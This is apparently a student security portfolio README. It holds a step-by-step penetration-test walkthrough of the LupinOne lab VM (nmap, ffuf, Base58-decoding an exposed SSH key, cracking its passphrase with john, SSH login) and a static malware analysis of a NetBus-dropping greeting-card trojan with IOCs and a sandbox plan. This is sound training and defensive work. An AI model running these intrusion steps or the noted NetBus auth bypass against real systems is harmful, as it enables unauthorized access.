

##  Repository Structure

```
Empire-LupinOne-Pentest/
├── README.md                     # this file — project overview & structure
├── Empire-LupinOne-Report.pdf    # full penetration test report (PDF)
└── images/                       # screenshots referenced by the report
    ├── 01-target-vm-network.png      # target VM — host-only network config
    ├── 02-kali-vm-network.png        # attacker VM — host-only network config
    ├── 04-netdiscover.png            # host discovery
    ├── 05-nmap-quick.png             # initial nmap scan (22, 80)
    ├── 06-nmap-full.png              # full nmap -sV -sS -sC
    ├── 07-web-root.png               # web root page
    ├── 08-robots-txt.png             # robots.txt (Disallow /~myfiles)
    ├── 09-myfiles-404.png            # /~myfiles decoy (404)
    ├── 10-ffuf-dirs-setup.png        # ffuf directory fuzzing
    ├── 11-ffuf-secret-found.png      # /~secret/ discovered
    ├── 12-secret-directory.png       # note inside /~secret/
    ├── 13-ffuf-files-setup.png       # ffuf hidden-file fuzzing
    ├── 14-ffuf-mysecret-found.png    # .mysecret.txt discovered
    ├── 15-base58-blob.png            # encoded blob
    ├── 16-base58-decoded-key.png     # Base58 → OpenSSH key
    ├── 17-ssh2john.png               # ssh2john conversion
    ├── 19-john-permission.png        # john re-run with sudo
    ├── 20-john-cracked.png           # passphrase cracked
    ├── 21-ssh-key-attempt.png        # SSH key login attempt
    ├── 22-ssh-success.png            # successful SSH login (icex64)
    └── 24-user-flag.png              # user.txt captured
```

--

---

## 🎯 Target

| | |
|---|---|
| Host | `<target ip>` |
| OS | Debian 11 (Linux 5.10) |
| Difficulty | Medium |
| Services | `22/tcp` OpenSSH 8.4p1 · `80/tcp` Apache 2.4.48 |

---

##  Attack Chain at a Glance

```
netdiscover / nmap
        │  22 (ssh), 80 (http)
        ▼
robots.txt → /~myfiles (404 decoy)
        │
        ▼
ffuf  /~FUZZ           →  /~secret/  (301)
        │
        ▼
ffuf  /~secret/.FUZZ   →  .mysecret.txt  (hidden dot-file)
        │
        ▼
Base58 decode          →  OpenSSH private key (id_rsa)
        │
        ▼
ssh2john + john (fasttrack.txt)  →  passphrase: P@55w0rd!
        │
        ▼
chmod 600 + ssh -i id_rsa icex64@<target ip>   →  shell as icex64
        │
        ▼
      user.txt   captured
```

---

##  Key Takeaways

- **A private key was exposed over HTTP** — encoding (Base58) is not protection.
- **The passphrase was weak** (`fasttrack.txt`-crackable in ~1s).
- **`robots.txt` and naming conventions leaked structure**, and even a decoy narrowed the search.
- The compromise required *every* weak link — fixing any one breaks the chain.

---

##  Full Command Walkthrough

Every command used in the engagement, with inline comments. Replace `<target ip>`
with the machine's actual address on your lab network.

### 1 · Reconnaissance

```bash
# Discover live hosts on the local (host-only) segment via ARP.
# Reveals the target's IP without touching it noisily.
sudo netdiscover

# Quick default TCP scan — which ports are open?
# Result here: 22/tcp (ssh) and 80/tcp (http).
nmap <target ip>

# Deep scan of the two known ports:
#   -sS  SYN (stealth) scan
#   -sV  service/version detection (OpenSSH 8.4p1, Apache 2.4.48)
#   -sC  default NSE scripts (pulls http-robots.txt -> /~myfiles)
nmap -sV -sS -sC <target ip>
```

### 2 · Web Enumeration

```bash
# Read the robots.txt hinted at by nmap.
# It disallows /~myfiles ... which turns out to be a 404 decoy.
curl http://<target ip>/robots.txt

# The '~' prefix screams Apache userdir. Fuzz for real userdir names.
#   -w   wordlist
#   -c   colourised output
#   -ic  ignore wordlist comment lines
#   -fc 403   filter out 403 responses (noise)
# -> finds "secret" (HTTP 301), i.e. /~secret/
ffuf -u http://<target ip>/~FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403

# View the /~secret/ page — it contains a note from "icex64" saying an
# SSH private key is HIDDEN in this directory and the passphrase is
# crackable with "fasttrack". Two big hints in one message.
curl http://<target ip>/~secret/

# Fuzz again, this time for HIDDEN files (leading dot) inside /~secret/:
#   -e .txt,.html   also try these extensions on each word
# -> finds .mysecret.txt (HTTP 200, size 4689)
ffuf -u http://<target ip>/~secret/.FUZZ \
     -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
     -c -ic -fc 403 \
     -e .txt,.html
```

### 3 · Credential Access (recover & crack the SSH key)

```bash
# Grab the hidden file. It's ONE long high-entropy line — an encoded blob,
# not a raw key. Character set (no 0/O/I/l) => Base58.
curl http://<target ip>/~secret/.mysecret.txt

# Base58-decode the blob to recover the OpenSSH private key.
# (Done via an online Base58 decoder, or the CLI below.)
# Save the decoded output as id_rsa.
curl -s http://<target ip>/~secret/.mysecret.txt | base58 -d > id_rsa
#   ^ if the 'base58' tool isn't installed:  pip install base58   (or use an online decoder)

# The key is passphrase-protected. Convert it to a John-crackable hash.
ssh2john id_rsa > hash.txt

# Crack the passphrase using the author-hinted 'fasttrack' wordlist.
# (First run without sudo may hit "Permission denied" on the wordlist path —
#  re-run with sudo as shown.)
sudo john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
#   -> recovered passphrase:  P@55w0rd!

# (Optional) redisplay the cracked passphrase later:
john --show hash.txt
```

### 4 · Initial Access (SSH foothold)

```bash
# SSH rejects world-readable private keys with "bad permissions".
# Lock the key down to owner-read/write only.
chmod 600 id_rsa

# Log in with the recovered key as icex64 (username came from the note).
# When prompted for the key passphrase, enter:  P@55w0rd!
ssh -i id_rsa icex64@<target ip>
```

### 5 · User Flag

```bash
# Now on the box as icex64 — read the user flag from the home directory.
cat user.txt
#   -> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

---

## Tools Used

`netdiscover` · `nmap` · `ffuf` · `ssh2john` · `john` · Base58 decoder · `ssh`

---

##  Findings Summary

| # | Finding | Severity |
|---|---|---|
| F-01 | SSH private key exposed on the public web server | Critical |
| F-02 | Weak passphrase on the SSH private key | High |
| F-03 | Sensitive content hidden by obscurity only | Medium |
| F-04 | Information disclosure via robots.txt / naming | Low |
| F-05 | Verbose service / version banners | Informational |

---

##  part 2
# Malware Analysis Report — `GRAFFITI.exe`

**Analyst:** Kenil
**Date:** 2026-07-21
**Sample source:** University coursework (supplied for analysis)
**Analysis type:** Static triage (completed) + behavioural analysis plan
**Environment:** Isolated Linux sandbox — the sample was **never executed**

---

## 1. Executive summary

`GRAFFITI.exe` is a **self-extracting Trojan dropper** built around a legitimate-looking
**Macromedia Director multimedia "greeting card."** When run it displays the lure
*"Opening your greeting, Please wait…"*, extracts a bundled payload to disk, writes to the
registry, and launches an executable via `ShellExecuteExA`.

The package ships with the original **NetBus v1.70 manual** (`NetBus.rtf`) and two empty
NetBus-client artefact files (`Hosts.txt`, `Memo.txt`). NetBus is a well-documented Windows
**Remote Access Trojan (RAT)** whose server component (`Patch.exe`) installs itself for
persistence, hides, and listens on **TCP 12345/12346** for full remote control (keylogging,
screen capture, file access, command execution).

**Assessment.** All static evidence is consistent with the classic "NetBus hidden inside a
greeting card / game" distribution method. However — and this matters for an honest report —
static analysis did **not** recover a NetBus server binary from the sample: the greeting-card
payload is stored in Macromedia Director's proprietary compressed container and could not be
decompressed with standard tools, and no cleartext NetBus/`Patch.exe`/`12345` indicators
appear in the extractor. **Confirming that the RAT is actually delivered therefore requires
dynamic/behavioural analysis** (Section 6). The classification below is stated at the
appropriate confidence level for each claim.

**Verdict:** Trojan dropper (greeting-card lure) — *NetBus RAT delivery strongly indicated,
pending behavioural confirmation.*

---

## 2. File identification & hashes

| Property | Value |
|---|---|
| File name | `GRAFFITI.exe` |
| Size | 1,306,241 bytes |
| Type | PE32 executable (GUI), Intel 80386 — **with an appended ZIP overlay** |
| MD5 | `037356668c6da7e6a0fcc305db97e6ff` |
| SHA-1 | `6d021798a3f4fc2406cbd3a02d1e8363ce62ed31` |
| SHA-256 | `09c00ae65e75bc01cd018a27d718d39a4e9237bda8cbaf1fb37b1f251910e6e1` |
| Compile timestamp | 2000-01-20 11:12:01 UTC |
| Linker | Microsoft Visual C++ 6.0 |
| Subsystem | GUI (2) |

The archive as delivered also contained: `Hosts.txt` (0 bytes), `Memo.txt` (0 bytes) and
`NetBus.rtf` (22,729 bytes). The two empty text files match filenames used by the **NetBus
client** for saved host lists / notes — i.e. the folder looks like a collected artefact set,
not just a single sample.

---

## 3. Structure — a nested "Russian doll"

```
GRAFFITI.exe                         PE32 stub (~176 KB, NOT packed) + appended ZIP
  └── [ZIP overlay @ offset 176128]
        └── card.lng                 1.54 MB — "grafPrf" container (Macromedia Director bundle)
              ├── fileio.dll         Director "FileIO Xtra" (gives Lingo scripts file access)
              ├── GREETING.EXE        Director projector (the multimedia greeting card)
              └── LINGO.INI           Director configuration
```

Evidence for each layer:

- **PE stub + overlay.** The file starts with `MZ` (a valid PE), 4 sections, none high-entropy
  (`.text` 6.59, `.rdata` 4.58, `.data` 4.68, `.rsrc` 3.62) → **the stub itself is not packed
  or crypted.** The last section ends at offset 176,128; the remaining **1,130,113 bytes are an
  overlay** — a ZIP whose End-of-Central-Directory sits at the tail (offset 1,306,219).
- **Single appended archive.** `unzip` on the `.exe` lists exactly one member, `card.lng`.
  Other `PK\x03\x04` byte-matches found inside the PE (offsets 0x67a6, 0x6b61, 0x21e18…) are
  **coincidental sequences inside the extractor's x86 code**, not real ZIP headers — parsing
  them yields impossible field values (e.g. name length 24,224). So there is **one** real
  appended archive.
- **grafPrf container.** `card.lng` is not a language file. Its header is the ASCII magic
  `grafPrf` followed by a manifest listing `fileio.dll` (12,832 B), `GREETING.EXE`
  (1,531,622 B) and `LINGO.INI` (67 B), an `end.end` delimiter, and the greeting message text
  (*"Your dearest friend. When the going ge…"*).
- **Macromedia Director identification.** `fileio.dll` is Director's standard **FileIO Xtra**,
  `LINGO.INI` is Director's config, and *Lingo* is Director's scripting language. The payload's
  entropy map shows a compressed block (~0x20000–0x90000, entropy 7.6–7.9) typical of Director
  cast/media data. This proprietary compression is why the embedded executables cannot be
  carved as raw PEs and why standard `zlib`/`gzip`/raw-`deflate` fail to inflate it.

---

## 4. Behavioural profile of the extractor stub (static)

Imported API set (selected, from the Import Address Table):

| Capability | APIs observed | Interpretation |
|---|---|---|
| Locate temp / working dir | `GetTempPathA`, `GetModuleFileNameA` | chooses where to drop files |
| Drop files to disk | `CreateFileA`, `WriteFile`, `CreateDirectoryA`, `ReadFile`, `SetFilePointer`, `FindFirstFileA/FindNextFileA`, `DeleteFileA`, `RemoveDirectoryA` | classic SFX / dropper file I/O |
| **Write to registry** | `RegCreateKeyExA`, `RegSetValueExA`, `RegOpenKeyExA`, `RegCloseKey` | creates/sets registry values |
| Write INI settings | `WritePrivateProfileStringA` | matches `LINGO.INI` |
| **Execute a program** | `ShellExecuteExA` | launches an EXE after extraction |
| UI / lure | `CreateDialogIndirectParamA`, `SetForegroundWindow`, GDI bitmap/palette calls | shows the "greeting" window |

Relevant string constants recovered from the stub:

- Lure: **`Opening your greeting, Please wait...`**
- Working files: **`\card.lng`**, `\card.zip`, `\card.zzz`, `card.lngUT`
- No cleartext `Software\…\Run`, `Patch.exe`, `NetBus`, or `12345` in the stub.

**Interpretation.** The stub is a dropper: it locates a working directory, extracts the bundled
files, writes registry/INI values, and runs an executable while showing a greeting-card lure.
Notably there are **no networking APIs** (no WinSock/WinINet) in the stub — so any C2/network
capability lives in the **dropped payload**, not the extractor. The absence of a plaintext
`Run` key is consistent with NetBus, whose server (`Patch.exe`) performs **its own** persistence
and stealth at runtime (per the bundled manual), rather than the dropper doing it.

---

## 5. NetBus RAT reference (from `NetBus.rtf` + threat-intel OSINT)

The bundled `NetBus.rtf` is the genuine **NetBus v1.70** manual (©1998, Carl-Fredrik Neikter).
Key facts (corroborated by Trend Micro, Microsoft, MyCERT, GIAC/SANS write-ups):

- **Components:** a *client* (attacker) and a *server* = **`Patch.exe`** (victim).
- **Install/persistence:** running `Patch.exe` installs the server so it **auto-starts every
  Windows session** (registry `Run` key) and **hides itself** at start-up.
- **Ports:** listens on **TCP 12345** (default) and responds on **12346**.
- **Command-line switches:** `/noadd` (don't persist), `/remove`, `/pass:xxx`, `/port:xxx`.
- **Capabilities:** keystroke logging ("listen for keystrokes and send them back"), screen
  capture, send keystrokes to the active app, open/close CD-ROM, swap mouse buttons, start any
  application, play sounds / show images, navigate the mouse, message dialogs, shutdown/logoff,
  open arbitrary URLs, port scanner, port/application redirect, and IP-based access restriction.
- **Weaknesses (useful for detection/attribution):** unencrypted protocol; commands are simple
  `name;arg;arg` strings; the password is stored **in cleartext** in the registry at
  `HKCU\Patch\Settings\ServerPwd`; there is a known auth-bypass backdoor
  (`Password;1;<anything>`). Reference CVE: **CAN-1999-0660**. A keylogger DLL, **`KeyHook.dll`**,
  is typically dropped in the Windows directory.
- **Distribution:** NetBus was famously hidden inside benign-looking programs — the "Whack-A-Mole"
  game is the textbook example; **greeting cards fit the exact same pattern** as this sample.

---

## 6. Behavioural / dynamic analysis plan

Static triage cannot safely confirm the runtime payload, so the following should be run **in an
isolated, disposable VM** (FLARE-VM snapshot, host-only or fake-net networking, no shared
folders/clipboard). **Do not detonate on a real machine or a networked host.**

**Lab setup**
- Windows VM (Windows 2000/XP era matches the sample; a modern Win10 VM also works for triage).
- Network faking: **INetSim** or **FakeNet-NG** to capture C2 without real egress.
- Snapshot the clean state before every run.

**Instrumentation to run before detonation**
- **Procmon** (Sysinternals) — file, registry, and process activity (filter on the sample and
  children). Watch for: files written to `%TEMP%`/`%WINDIR%`/`%SYSTEM%`, creation of
  `Patch.exe` or `KeyHook.dll`, and any new `HKLM\...\CurrentVersion\Run` /
  `HKCU\Patch\Settings*` values.
- **Process Explorer / Process Hacker** — child processes spawned by `ShellExecuteExA`.
- **Autoruns** — diff persistence entries before/after.
- **Regshot** — snapshot-diff the registry across the run.
- **Wireshark + INetSim/FakeNet** — watch for a listener on **TCP 12345/12346** and any outbound
  beacon or e-mail IP-notification (NetBus can e-mail the victim IP to the attacker).

**Detonation steps**
1. Run `GRAFFITI.exe`; confirm the greeting-card window and the *"Opening your greeting…"* lure.
2. Let the Director projector run (the malicious action in these droppers is often in the
   **Lingo** script, which uses the FileIO Xtra to drop and then `open`/shell-exec the server).
3. Capture every dropped file; hash them and identify PEs (expect `Patch.exe` / NetBus server,
   possibly `KeyHook.dll`).
4. Check for a new listening socket on **12345** (`netstat -ano`, or Wireshark). A Telnet to
   `localhost:12345` that returns a NetBus name/version banner is a positive confirmation.
5. Diff registry/autoruns for the persistence `Run` key and `HKCU\Patch\Settings\ServerPwd`.

**Optional automated sandboxing:** submit to a **CAPE** or **Cuckoo** instance (CAPE has good
config/keylogger extraction) and/or a reputable online sandbox for a second opinion and a
family verdict.

**Follow-up static, if a server binary is recovered:** load `Patch.exe` in Ghidra/IDA, confirm
the `12345` bind, command dispatcher (`;`-delimited), and the `ServerPwd` registry write. Also
worth attempting: a Director-aware tool to unpack `card.lng` and read the **Lingo** script to
see exactly how it drops/launches the payload — this is the cleanest static confirmation.

---

## 7. Indicators of Compromise (IOCs)

**Sample hashes**
- `GRAFFITI.exe` SHA-256 `09c00ae65e75bc01cd018a27d718d39a4e9237bda8cbaf1fb37b1f251910e6e1`
- `card.lng` SHA-256 `6ec98e5d01a4dbc09d7b56b705cc172a9dbaa8e547bed243b7428a73a87ebce5`
  (MD5 `a3ec3bd60ddf969debb930225256a71d`)

**File / on-disk (watch for at runtime)**
- Bundle magic string `grafPrf`; working files `card.lng` / `card.zip` / `card.zzz`
- Dropped `Patch.exe` (NetBus server) and/or `KeyHook.dll` (keylogger) in `%WINDIR%`/`%SYSTEM%`

**Registry (NetBus)**
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — auto-start entry for the server
- `HKCU\Patch\Settings` and `HKCU\Patch\Settings\ServerPwd` (cleartext password)

**Network (NetBus)**
- Listener on **TCP 12345**, response on **TCP 12346**; unencrypted `command;arg;arg` traffic;
  possible outbound e-mail IP-notification.

**Host string**
- Lure text: `Opening your greeting, Please wait...`

---

## 8. Recommendations

- Treat the sample strictly as live malware: analyse only in an isolated, snapshot-restored VM.
- For detection engineering, prioritise the **behavioural** IOCs (port 12345/12346, the `Patch`
  registry keys, `KeyHook.dll`) over the file hash, since the dropper wrapper is trivial to
  re-pack.
- If this represents a real infection rather than a lab sample: isolate the host, block
  12345/12346 at the perimeter, remove the `Run`-key persistence and dropped binaries, and rotate
  any credentials that could have been keylogged.

---

## Appendix A Analysis limitations (for transparency)

1. The greeting-card payload uses **Macromedia Director's proprietary compression**; standard
   `zlib`/`gzip`/raw-`deflate` did not inflate it, so `GREETING.EXE`/`fileio.dll` were not
   recovered as raw PEs and could not be statically disassembled.
2. Consequently, **no NetBus server binary was directly extracted** from the sample by static
   means, and no cleartext NetBus/`Patch.exe`/`12345` strings appear in the extractor. The RAT
   attribution rests on (a) the bundled NetBus manual and client artefacts, (b) the dropper's
   behaviour (temp extraction + registry writes + `ShellExecuteExA` + greeting lure), and (c)
   the historical greeting-card distribution pattern — all **strongly indicative**, but
   **behavioural analysis (Section 6) is required for definitive confirmation.**
3. The sample was **not executed** in this environment.


---

*Author: Kenil · Lab environment
